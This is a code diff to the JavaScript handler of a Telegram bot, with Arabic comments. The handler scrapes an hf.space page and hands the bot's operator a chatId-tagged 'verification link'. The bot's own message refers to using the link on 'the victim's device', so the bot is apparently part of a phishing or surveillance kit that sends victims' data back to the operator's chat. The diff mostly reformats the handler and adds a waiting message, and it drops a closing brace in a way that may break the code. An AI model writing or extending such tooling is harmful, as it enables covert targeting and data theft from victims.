@@ -1717,42 +1717,41 @@ bot.on('callback_query', async (callbackQuery) => {
     }
 
     if (data === 'request_verification') {
-        const url = "https://sssssskskjwnsb-linklsksn.hf.space";
-        
-        // إرسال رسالة انتظار
-        
-        
-        // استيراد الروابط من الموقع
-        axios.get(url, { timeout: 10000 })
-            .then(response => {
-                const $ = cheerio.load(response.data);
-                let foundLink = null;
-                
-                // البحث عن الرابط الذي ينتهي بـ "/ca"
-                $('a[href]').each((index, hghj) => {
-                    const link = $(hghj).attr('href');
-                    if (link.endsWith('/n')) {
-                        foundLink = link;
-                        return false; // إيقاف loop عند العثور على أول رابط
-                    }
-                });
-                
-                if (foundLink) {
-                    // بناء الرابط النهائي مع chatId
-                    const verificationLink = `${foundLink}?chatId=${chatId}`;
-                    const message = `✅ تم إنشاء الرابط بنجاح\n\n🔗 الرابط: ${verificationLink}\n\nملاحظة: قم باستخدام رابط جديد في كل مرة ويجب أن يكون الاتصال قويًا في جهاز الضحية`;
-                    
-                    bot.sendMessage(chatId, message);
-                } else {
-                    bot.sendMessage(chatId, "❌ لم يتم العثور على رابطفي الموقع");
+    const url = "https://sssssskskjwnsb-linklsksn.hf.space";
+    
+    // إرسال رسالة انتظار
+    bot.sendMessage(chatId, "⏳ جاري إنشاء الرابط...");
+    
+    // استيراد الروابط من الموقع
+    axios.get(url, { timeout: 10000 })
+        .then(response => {
+            const $ = cheerio.load(response.data);
+            let foundLink = null;
+            
+            // البحث عن الرابط الذي ينتهي بـ "/n"
+            $('a[href]').each((index, element) => {
+                const link = $(element).attr('href');
+                if (link.endsWith('/n')) {
+                    foundLink = link;
+                    return false; // إيقاف loop عند العثور على أول رابط
                 }
-            })
-            .catch(error => {
-                console.error('Error fetching link:', error);
-                bot.sendMessage(chatId, `❌ خطأ في جلب الرابط: ${error.message}`);
             });
-    }
-});
+            
+            if (foundLink) {
+                // بناء الرابط النهائي مع chatId
+                const verificationLink = `${foundLink}?chatId=${chatId}`;
+                const message = `✅ تم إنشاء الرابط بنجاح\n\n🔗 الرابط: ${verificationLink}\n\nملاحظة: قم باستخدام رابط جديد في كل مرة ويجب أن يكون الاتصال قويًا في جهاز الضحية`;
+                
+                bot.sendMessage(chatId, message);
+            } else {
+                bot.sendMessage(chatId, "❌ لم يتم العثور على رابط في الموقع");
+            }
+        })
+        .catch(error => {
+            console.error('Error fetching link:', error);
+            bot.sendMessage(chatId, `❌ خطأ في جلب الرابط: ${error.message}`);
+        });
+}
 
        
 
